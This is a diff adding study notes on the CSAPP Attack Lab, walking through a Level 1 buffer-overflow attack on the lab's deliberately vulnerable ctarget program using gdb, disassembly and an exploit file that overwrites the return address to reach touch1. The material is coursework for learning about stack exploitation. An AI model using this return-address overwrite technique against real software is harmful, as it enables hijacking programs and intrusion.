@@ -1234,6 +1234,8 @@ Here is the assembly code of `phase_5(...)`.
 
 #### 3) Attack Lab
 
+##### Preparation 
+
 **(1) What is the attack lab?**
 
 It includes two programs with vulnerability and we should generate five attacks to exploit their security weakness.
@@ -1300,7 +1302,7 @@ Read section 3.12 and 3.12.1 of CSAPP 2e as reference material of this lab since
 
    The reason is that we can not connect the course's specific grading server network, and my local machine is not recognised. 
 
-   How to solve it ? 
+   *How to solve it ?* 
 
    Add an option `-q` after the executable file. It is the same with `rtarget`. 
 
@@ -1308,8 +1310,130 @@ Read section 3.12 and 3.12.1 of CSAPP 2e as reference material of this lab since
    ./ctarget -q  # -q instructs not to send results to the grading server. 
    ```
 
+   When debugging with `gdb`, we can add the option after `start`
+   
+   ```shell
+   (gdb)start -q  
+   # or
+   (gdb)run -q
+   ```
+   
+   
+   
    See [resolving issues](.\Tutorials\Others\Resolving Issues of CSAPP Labs.md) and [page 4 of "attacklab.pdf".](.\labs\labs_of_CSAPP3e\3_Attack_Lab\attacklab.pdf)
 
 **(5) How to do the attack lab?** 
 
 If we type a long string, the bounds of arrays will be overrun. Whereas, we should not input meaningless strings to cause buffer overflow only, but do something more interesting. 
+
+##### Starting Attacks
+
+**Part I: Code Injection Attacks**
+
+###### Level 1  touch1
+
+To Call `touch1` when `getbuf()` returns instead of returning to the caller: `test()`.
+
+Tips: 
+
+1. Find the "BUFFER_SIZE".
+
+*Analyses:* 
+
+The C code of `test()` in the ["attacklab.pdf".](.\labs\labs_of_CSAPP3e\3_Attack_Lab\attacklab.pdf) is as follows: 
+
+```c
+1 void test()
+2 {
+3 	int val;
+4 	val = getbuf();
+5 	printf("No exploit. Getbuf returned 0x%x\n", val);
+6 }
+```
+
+(1) In order to test, I input `abcd` and let the program run to `0x4017ac` in `getbuf()`.
+
+```shell
+(gdb)
+0x00000000004017af      14      in buf. # Gets() is being called. 
+(gdb)
+Type string:abcd
+```
+
+Here is the disassemble code of `test()` and `getbuf()`:
+
+```assembly
+0000000000401968 <test>:
+  401968:	48 83 ec 08          	sub    $0x8,%rsp
+  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
+  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
+  401976:	89 c2                	mov    %eax,%edx
+  401978:	be 88 31 40 00       	mov    $0x403188,%esi
+  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
+  401982:	b8 00 00 00 00       	mov    $0x0,%eax
+  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
+  40198c:	48 83 c4 08          	add    $0x8,%rsp
+  401990:	c3                   	retq   
+ 
+ #.........
+
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+> 4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq   
+```
+
+When the program is running to `0x4017ac`, I examine the content at the address of `($rsp + 0x28) `; it is 
+
+```shell
+(gdb)x/x ($rsp + 0x28)  # 0x401976
+```
+
+`0x401976` is exactly the address where the instruction follows the call of `getbuf()` and it is what we are going to corrupt. 
+
+(2) Since in `getbuf()` the stack pointer `%rsp` is decreased by `0x28` which is 40, I modify my input with 10 lines of `61 62 63 64`  in `exploit.txt`. 
+
+```txt
+  1 61 62 63 64   /* a b c d */
+  2 61 62 63 64
+  3 61 62 63 64
+  4 61 62 63 64
+  5 61 62 63 64
+  6 61 62 63 64
+  7 61 62 63 64
+  8 61 62 63 64
+  9 61 62 63 64
+ 10 61 62 63 64
+```
+
+Then I check the current stack of `getbuf()`, I find the last byte of the return address has been corrupted by the terminal `00` of my input string. 
+
+```shell
+(gdb) x/wx ($rsp + 0x28)
+0x5561dca0:     0x00401900	# The original "76" is replaced by 00('\0'). 
+```
+
+That indicates my input has already overwrite part of the return address. 
+
+(3) Let's move on. N.B. The starting address of `touch1` is `0x004017c0`. 
+
+```assembly
+00000000004017c0 <touch1>:
+  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
+  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
+# ...
+```
+
+Hence, I input the return address of `touch1` in the line of 11. Note the order of bytes is little endian; the bytes should be as follows:
+
+```txt
+11 c0 17 40 00   /* the return address of touch1 */
+```
+
+Great! It called `touch1`. 
+
+
+
